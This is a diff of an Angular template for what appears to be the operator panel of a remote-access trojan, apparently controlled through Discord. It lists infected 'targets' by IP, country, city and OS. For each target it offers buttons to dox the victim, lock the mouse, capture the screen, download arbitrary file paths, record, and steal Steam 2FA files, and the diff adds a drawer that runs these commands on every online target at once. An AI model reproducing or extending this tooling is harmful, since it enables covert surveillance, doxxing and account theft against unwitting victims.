@@ -1,87 +1,155 @@
-<div id="search">
-  <mat-icon>search</mat-icon>
-  <mat-form-field appearance="fill">
-    <mat-label>search</mat-label>
-    <input matInput [(ngModel)]="search" (input)="searchQuery()" placeholder="Ex. tel aviv" >
-  </mat-form-field>
-  <mat-slide-toggle disableRipple="true" class="onlineFilter" (change)="onlineFilterClicked()" [(ngModel)]="showOnlineTargetsOnly">Online targets only</mat-slide-toggle>
-</div>
-<div class="center">
-  <mat-accordion *ngIf="targets">
-    <mat-expansion-panel (click)="changePanelState()" *ngFor="let target of targetsSearch" [disabled]="!target.online">
-      <mat-expansion-panel-header>
-        <mat-panel-title>
-          <mat-icon class="online" *ngIf="(target && target.online)">wifi</mat-icon>
-          <mat-icon class="offline" *ngIf="(!(target && target.online))">wifi_off</mat-icon>
-          {{ target.identifier }}
-        </mat-panel-title>
-        <mat-panel-description>
-          IP: {{ target.metadata.ip }} | COUNTRY: {{ target.metadata.country }} | CITY: {{ target.metadata.city }} | OS: {{ target.metadata.os }}
-        </mat-panel-description>
-      </mat-expansion-panel-header>
-      <div class="commandBtns">
-        <div>
-          <button mat-button [disabled]="!target.online" color="accent"
-            (click)="wrocsidHandler('dox', target.identifier)">Dox</button>
-        </div>
-        <div>
-          <form [formGroup]="mouseForm">
-            <button mat-button [disabled]="!target.online || !mouseForm.valid" color="accent"
-            (click)="wrocsidHandler('mouse', target.identifier, concatTime(mouseForm))">Mouse Lock</button>
-            <mat-form-field appearance="fill" class="timeInput">
-              <mat-label>Time amount</mat-label>
-              <input matInput required type="number" min="1" #timeAmount formControlName="timeAmount">
-              <mat-error *ngIf="mouseForm.get('timeAmount')?.invalid">Not a valid number...</mat-error>
-            </mat-form-field>
-            <mat-form-field appearance="fill" class="timeInput">
-              <mat-label>Time units</mat-label>
-              <select matNativeControl required [attr.disabled]="!target.online" #timeUnits formControlName="timeUnits">
-                <option value="s">Seconds</option>
-                <option value="m">Minutes</option>
-                <option value="h">Hours</option>
-              </select>
-            </mat-form-field>
-          </form>
-        </div>
-        <div>
-          <button mat-button [disabled]="!target.online" color="accent"
-            (click)="wrocsidHandler('screen', target.identifier)">Screen</button>
-        </div>
-        <div>
-          <form [formGroup]="downloadForm">
-          <button mat-button [disabled]="!target.online || !downloadForm.valid" color="accent"
-            (click)="wrocsidHandler('download', target.identifier, getPath(downloadForm))">Download</button>
-            <mat-form-field appearance="fill" class="timeInput">
-              <mat-label>Path</mat-label>
-              <input matInput required formControlName="path" #path>
-              <mat-error *ngIf="downloadForm.get('path')?.invalid">Not a valid path...</mat-error>
-            </mat-form-field>
-          </form>
-        </div>
-        <div>
-            <form [formGroup]="recordForm">
-              <button mat-button [disabled]="!target.online || !recordForm.valid" color="accent"
-              (click)="wrocsidHandler('record', target.identifier, concatTime(recordForm))">Record</button>
-              <mat-form-field appearance="fill" class="timeInput">
-                <mat-label>Time amount</mat-label>
-                <input matInput required type="number" min="1" #timeAmount formControlName="timeAmount">
-                <mat-error *ngIf="recordForm.get('timeAmount')?.invalid">Not a valid number...</mat-error>
-              </mat-form-field>
-              <mat-form-field appearance="fill" class="timeInput">
-                <mat-label>Time units</mat-label>
-                <select matNativeControl required [attr.disabled]="!target.online" #timeUnits formControlName="timeUnits">
-                  <option value="s">Seconds</option>
-                  <option value="m">Minutes</option>
-                  <option value="h">Hours</option>
-                </select>
-              </mat-form-field>
-            </form>
-        </div>
-        <div>
-          <button mat-button [disabled]="!target.online" color="accent"
-            (click)="wrocsidHandler('getSteam2fa', target.identifier)">Get Steam 2FA Files</button>
-        </div>
+<mat-drawer-container autosize class="main">
+  <mat-drawer #drawer mode="side">
+    <mat-card class="commandBtnsAll">
+      <h1 class="title"> Run on all online targets</h1>
+      <div>
+        <button mat-button color="accent" (click)="sendCommandToAllOnlineTargets('dox')">Dox</button>
       </div>
-    </mat-expansion-panel>
-  </mat-accordion>
+      <div>
+        <form [formGroup]="mouseFormAll">
+          <button mat-button [disabled]="!mouseFormAll.valid" color="accent" (click)="sendCommandToAllOnlineTargets('mouse', concatTime(mouseFormAll))">Mouse Lock</button>
+          <mat-form-field appearance="fill" class="timeInput">
+            <mat-label>Time amount</mat-label>
+            <input matInput required type="number" min="1" #timeAmount formControlName="timeAmount">
+            <mat-error *ngIf="mouseFormAll.get('timeAmount')?.invalid">Not a valid number...</mat-error>
+          </mat-form-field>
+          <mat-form-field appearance="fill" class="timeInput">
+            <mat-label>Time units</mat-label>
+            <select matNativeControl required #timeUnits formControlName="timeUnits">
+              <option value="s">Seconds</option>
+              <option value="m">Minutes</option>
+              <option value="h">Hours</option>
+            </select>
+          </mat-form-field>
+        </form>
+      </div>
+      <div>
+        <button mat-button color="accent" (click)="sendCommandToAllOnlineTargets('screen')">Screen</button>
+      </div>
+      <div>
+        <form [formGroup]="downloadFormAll">
+        <button mat-button [disabled]="!downloadFormAll.valid" color="accent" (click)="sendCommandToAllOnlineTargets('download', getPath(downloadFormAll))">Download</button>
+          <mat-form-field appearance="fill" class="timeInput">
+            <mat-label>Path</mat-label>
+            <input matInput required formControlName="path" #path>
+            <mat-error *ngIf="downloadFormAll.get('path')?.invalid">Not a valid path...</mat-error>
+          </mat-form-field>
+        </form>
+      </div>
+      <div>
+        <form [formGroup]="recordFormAll">
+          <button mat-button [disabled]="!recordFormAll.valid" color="accent" (click)="sendCommandToAllOnlineTargets('record', concatTime(recordFormAll))">Record</button>
+          <mat-form-field appearance="fill" class="timeInput">
+            <mat-label>Time amount</mat-label>
+            <input matInput required type="number" min="1" #timeAmount formControlName="timeAmount">
+            <mat-error *ngIf="recordFormAll.get('timeAmount')?.invalid">Not a valid number...</mat-error>
+          </mat-form-field>
+          <mat-form-field appearance="fill" class="timeInput">
+            <mat-label>Time units</mat-label>
+            <select matNativeControl required #timeUnits formControlName="timeUnits">
+              <option value="s">Seconds</option>
+              <option value="m">Minutes</option>
+              <option value="h">Hours</option>
+            </select>
+          </mat-form-field>
+        </form>
+      </div>
+      <div>
+        <button mat-button color="accent" (click)="sendCommandToAllOnlineTargets('getSteam2fa')">Get Steam 2FA Files</button>
+      </div>
+    </mat-card>
+  </mat-drawer>
+  <button mat-raised-button id="openDrawerOnHover" (click)="drawer.toggle()">
+    <mat-icon *ngIf="drawer.opened">arrow_back_ios</mat-icon>
+    <mat-icon *ngIf="!drawer.opened">arrow_forward_ios</mat-icon>
+  </button>
   <div>
+    <div id="search">
+      <mat-icon>search</mat-icon>
+      <mat-form-field appearance="fill">
+        <mat-label>search</mat-label>
+        <input matInput [(ngModel)]="search" (input)="searchQuery()" placeholder="Ex. tel aviv" >
+      </mat-form-field>
+      <mat-slide-toggle disableRipple="true" class="onlineFilter" (change)="onlineFilterClicked()" [(ngModel)]="showOnlineTargetsOnly">Online targets only</mat-slide-toggle>
+    </div>
+    <div class="center">
+      <mat-accordion *ngIf="targets">
+        <mat-expansion-panel (click)="changePanelState()" *ngFor="let target of targetsSearch" [disabled]="!target.online">
+          <mat-expansion-panel-header>
+            <mat-panel-title>
+              <mat-icon class="online" *ngIf="(target && target.online)">wifi</mat-icon>
+              <mat-icon class="offline" *ngIf="(!(target && target.online))">wifi_off</mat-icon>
+              {{ target.identifier }}
+            </mat-panel-title>
+            <mat-panel-description>
+              IP: {{ target.metadata.ip }} | COUNTRY: {{ target.metadata.country }} | CITY: {{ target.metadata.city }} | OS: {{ target.metadata.os }}
+            </mat-panel-description>
+          </mat-expansion-panel-header>
+          <div class="commandBtns">
+            <div>
+              <button mat-button [disabled]="!target.online" color="accent"
+                (click)="wrocsidHandler('dox', target.identifier)">Dox</button>
+            </div>
+            <div>
+              <form [formGroup]="mouseForm">
+                <button mat-button [disabled]="!target.online || !mouseForm.valid" color="accent"
+                (click)="wrocsidHandler('mouse', target.identifier, concatTime(mouseForm))">Mouse Lock</button>
+                <mat-form-field appearance="fill" class="timeInput">
+                  <mat-label>Time amount</mat-label>
+                  <input matInput required type="number" min="1" #timeAmount formControlName="timeAmount">
+                  <mat-error *ngIf="mouseForm.get('timeAmount')?.invalid">Not a valid number...</mat-error>
+                </mat-form-field>
+                <mat-form-field appearance="fill" class="timeInput">
+                  <mat-label>Time units</mat-label>
+                  <select matNativeControl required [attr.disabled]="!target.online" #timeUnits formControlName="timeUnits">
+                    <option value="s">Seconds</option>
+                    <option value="m">Minutes</option>
+                    <option value="h">Hours</option>
+                  </select>
+                </mat-form-field>
+              </form>
+            </div>
+            <div>
+              <button mat-button [disabled]="!target.online" color="accent"
+                (click)="wrocsidHandler('screen', target.identifier)">Screen</button>
+            </div>
+            <div>
+              <form [formGroup]="downloadForm">
+              <button mat-button [disabled]="!target.online || !downloadForm.valid" color="accent"
+                (click)="wrocsidHandler('download', target.identifier, getPath(downloadForm))">Download</button>
+                <mat-form-field appearance="fill" class="timeInput">
+                  <mat-label>Path</mat-label>
+                  <input matInput required formControlName="path" #path>
+                  <mat-error *ngIf="downloadForm.get('path')?.invalid">Not a valid path...</mat-error>
+                </mat-form-field>
+              </form>
+            </div>
+            <div>
+                <form [formGroup]="recordForm">
+                  <button mat-button [disabled]="!target.online || !recordForm.valid" color="accent"
+                  (click)="wrocsidHandler('record', target.identifier, concatTime(recordForm))">Record</button>
+                  <mat-form-field appearance="fill" class="timeInput">
+                    <mat-label>Time amount</mat-label>
+                    <input matInput required type="number" min="1" #timeAmount formControlName="timeAmount">
+                    <mat-error *ngIf="recordForm.get('timeAmount')?.invalid">Not a valid number...</mat-error>
+                  </mat-form-field>
+                  <mat-form-field appearance="fill" class="timeInput">
+                    <mat-label>Time units</mat-label>
+                    <select matNativeControl required [attr.disabled]="!target.online" #timeUnits formControlName="timeUnits">
+                      <option value="s">Seconds</option>
+                      <option value="m">Minutes</option>
+                      <option value="h">Hours</option>
+                    </select>
+                  </mat-form-field>
+                </form>
+            </div>
+            <div>
+              <button mat-button [disabled]="!target.online" color="accent"
+                (click)="wrocsidHandler('getSteam2fa', target.identifier)">Get Steam 2FA Files</button>
+            </div>
+          </div>
+        </mat-expansion-panel>
+      </mat-accordion>
+    </div>
+  </div>
+</mat-drawer-container>
